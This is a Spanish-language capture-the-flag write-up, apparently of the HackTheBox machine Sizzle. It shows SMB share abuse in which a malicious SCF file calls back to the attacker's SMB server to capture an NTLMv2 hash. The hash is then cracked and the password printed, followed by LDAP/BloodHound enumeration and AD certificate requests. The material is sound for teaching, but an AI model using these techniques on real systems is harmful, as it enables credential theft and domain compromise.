## Vulnerability Assessment {-}

### Recurso READ ONLY escribible {-}

Algo interesante con smb es que los derechos que vemos desde la montura no son los derechos reales del recurso compartido. Podemos usar de **smbcacls** para
controlar los derechos reales del directorio compartido.

```bash
smbcacls "//10.10.10.103/Department Shares" Users/amanda -N
``` 

Aqui vemos el derecho real de este directorio:

```{r, echo = FALSE, fig.cap="smbcacls rights", out.width="90%"}
    knitr::include_graphics("images/Sizzle-smbcacls-real-rights.png")
```

Como tenemos una montura podemos crear un script que nos permite enumerar los directorios para saber si hay un directorio con derechos de escritura.

```bash
cd /mnt/smb/Users
ls -l | awk 'NF{print $NF}' | while read directory; do echo -e "\n[+] Directory $directory; smbcacls "//10.10.10.10/Department Shares" Users/$directory -N | grep -i everyone ; done
```

Vemos que se puede escribir en el directorio Public. Creamos un fichero malicioso en este directorio.


### SCF fichero malicioso para smb {-}

Buscando por internet con las palabras `smb malicious file`, encontramos una possiblidad de injectar un fichero malicioso de typo SCF. Esta vulnerabilidad
consiste injectar una peticion a la maquina de atacante a partir del momento que alguien vea el icono del fichero creado.

1. Creamos un recurso compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. Creamos el ficher scf malicioso en el directorio **Public**

    ```bash
    cd /mnt/smb/Users/Public
    nano file.scf

    [Shell]
    Command=2
    IconFile=\\10.10.16.3\smbFolder\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

1. Esperamos un momentito

Ya vemos que una conexion se a establecida y vemos un hash NTLM de version 2 para el usuario amanda.

### Crackeamos el hash con john {-}

Copiamos el hash en un fichero y intentamos crackearlo con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt amanda_hash
```

ya tenemos una credencial para el usuario amanda.

Checkeamos la validez de esta credencial con **crackmapexec**

```bash
crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Vemos que es valida pero no nos podemos conectar porque ne esta el famoso **Pwn3d**

### Enumeracion de usuarios con rpcclient {-}

```bash
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomusers'
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'enumdomgroups'
# get the rid of domain admins -> 0x200 in this example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'querygroupmem 0x200'
# get the rid of the users -> 0x1f4 for example
rpcclient -U "amanda%Ashare1972" 10.10.10.10 -c 'queryuser 0x1f4'
```

Nos creamos una lista de usuario desde rpcclient

```bash
cd content
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "amanda%Ashare1972" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
```

Como tenemos un listado de usuarios, lanzamos un ataque ASPRoasting para ver si encontramos el TGT de otro usuario.

### Asproasting attack {-}

```bash
GetNPUsers.py htb.local/amanda:Ashare1972 -no-pass -usersfile users
```

Aqui vemos que el ataque no aranca y es normal. Si miramos el contenido del fichero targeted de **nmap** vemos que el puerto 88 de Kerberos no
esta abierto y esto no nos permite ejecutar un ASPRoasting o un Kerberosting attack.


### LDAP domain dump {-}

Intentamos recuperar informaciones desde el ldap.

```bash
cd /var/www/html
ldapdomaindump -u "htb.local\amanda" -p Ashare1972 10.10.10.103 
```

Hemos podido dumpear las informaciones del ldap en ficheros web.

```bash
service apache2 start
```

y analizamos las informaciones desde firefox en la url `http://localhost`.

Las informaciones interesantes aqui son el echo que el usuario mrlky es kerberoasteable, y que el usuario amanda puede conectarse por WinRM.

Continuamos la enumeracion ldap con **bloodhound-python**


### Bloodhound desde la maquina de atacante {-}

**Bloodhound-python** permite recuperar la informacion del ldap desde la maquina de atacante

```bash
pip install bloodhound
bloodhound-python -d htb.local -u amanda -p Ashare1972 -gc sizzle.htb.local -c all -ns 10.10.10.103
```

Ahora que tenemos los ficheros `.json` creamos un zip para entrarlo en el bloodhound

```bash
ls -la *.json
zip htblocal.zip *.json
```

Ya lo podemos analizar desde bloodhound

```bash
sudo apt install neo4j bloodhound
sudo neo4j console
```

A partir de aqui, lanzamos desde una nueva terminal el bloodhound

```bash
bloodhound --no-sandbox &> /dev/null &
disown
```

Aqui ya nos podemos connectar a la base de datos neo4j y podemos *drag & drop* el zip y desde el menu Analysis miramos.


- Find all Domains Admins -> Miramos los administradores del dominio
- Find Shortest Paths to Domain Admins -> Via mas rapida de convertirnos en Administrador
- List all Kerberoastable Accounts -> Usuarios kerberoasteables (need of credentials)
- Find Principals with DCSync Right -> Atacantes pueden lanzar un secretsdump attack para recojer todos los hashes de usuarios cuando tiene el privilegio GetChangesAll.


Aqui vemos que los usuarios MRKLY y KRBTGT son kerberoasteable, tambien vemos que el usuario MRKLY tiene privilegios DSYNC con el GetChangesAll.
Aqui ya podemos ver por dondo van los tiros y que tendremos a un momento dado convertirnos en el usuario **MRKLY**. Pero para esto necesitamos primero
conectarnos a la maquina victima, y como podemos conectar con winrm con el usuario amanda intentamos connectarnos.

```bash
crackmapexec winrm 10.10.10.103 -u 'amanda' -p 'Ashare1972'
evil-winrm -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'
```

Aqui vemos que no tiene el Pwn3d! y que no podemos connectarnos. Como sabemos que este usuario se puede conectar miramos otra vez el fichero targeted y vemos que existe el 
puerto **5986** que es un **winrm con SSL** pero para esto necessitamos un certificado SSL. esto se suele encontrar en un directorio de la web.

Fuzzeamos la web.

### Fuzzeando la web con WFUZZ {-}

Como sabemos que el servicio web es un IIS, utilizamos un diccionario de SecList

```bash
cd /usr/share/seclists
find \-name \*IIS\*

wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/web-Content/IIS.fuzz.txt http://10.10.10.103/FUZZ
```

Aqui vemos un directorio `/certsrv`. Si entramos con firefox, hay un panel de inicio de session y si le ponemos las credenciales de amanda, podemos entrar.

Vemos un **Microsoft Active Directory Certificate Services**. Es un servicio que nos permite crear certificados para un usuario.

1. En la web le damos a `Request Certificate -> advanced certificate request`, vemos que tenemos que enviar un certificado base64-encoded CMC o PKCS
1. Creamos un certificado (Private Key) en la maquina de atacante

    ```bash
    openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
    cat amanda.csr | tr -d '\n' | xclip -sel clip
    ```

1. Colamos el contenido en la web y podemos descargar el DER encode certificate.


